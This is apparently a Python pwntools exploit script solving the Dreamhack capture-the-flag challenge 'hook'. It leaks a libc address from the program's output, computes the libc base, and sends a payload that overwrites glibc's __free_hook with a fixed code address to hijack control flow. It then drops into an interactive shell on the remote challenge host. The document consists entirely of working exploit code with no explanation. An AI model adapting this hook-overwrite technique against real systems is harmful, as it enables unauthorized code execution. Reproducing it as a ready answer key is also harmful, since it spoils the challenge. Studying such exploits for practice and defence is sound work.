#!/usr/bin/python3

from pwn import *

exe = ELF("./hook_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''
#         b *main+182
#         c
#         ''')
#         input()


if args.REMOTE:
    p = remote('host8.dreamhack.games', 14706)
else:
    p = process([exe.path])
# GDB()

p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline()[:-1],16)
libc.address = libc_leak - 0x3c5620
log.info('libc_leak: ' + hex(libc_leak))
log.info('libc_base: ' + hex(libc.address))
sla(b'Size: ', b'300')
payload = p64(libc.sym.__free_hook)
payload += p64(0x0000000000400a11)
sa(b'Data: ', payload)
p.interactive()

